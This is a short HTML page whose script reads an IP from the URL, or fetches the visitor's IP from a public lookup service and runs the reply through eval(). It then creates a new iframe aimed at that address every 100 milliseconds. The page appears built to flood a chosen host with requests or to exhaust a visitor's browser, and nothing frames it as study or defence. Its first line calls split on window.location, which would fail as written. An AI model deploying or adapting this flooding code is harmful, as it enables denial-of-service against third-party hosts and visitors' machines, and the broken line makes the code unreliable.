<html>
<head>
</head>
<body>
<script>
  let s = window.location.split("?")[1].split("=")
  
  if(s[0]=="ip") {
setInterval(()=>{
let i = document.createElement("iframe")
i.src=window.location.protocol+"//"+s[1]
document.body.appendChild(i)
},100)    
    
  } else {
    
fetch("https://api.ipify.org/?format=jsonp&callback=")
.then(r=>r.text())
.then(t=>{
  console.log(t)
  let j = eval(t)
  console.log(j)
setInterval(()=>{
let i = document.createElement("iframe")
i.src=window.location.protocol+"//"+j.ip+"?ip="+j.ip
document.body.appendChild(i)
},100)
})
    
  }

</script>
</body>
</html>
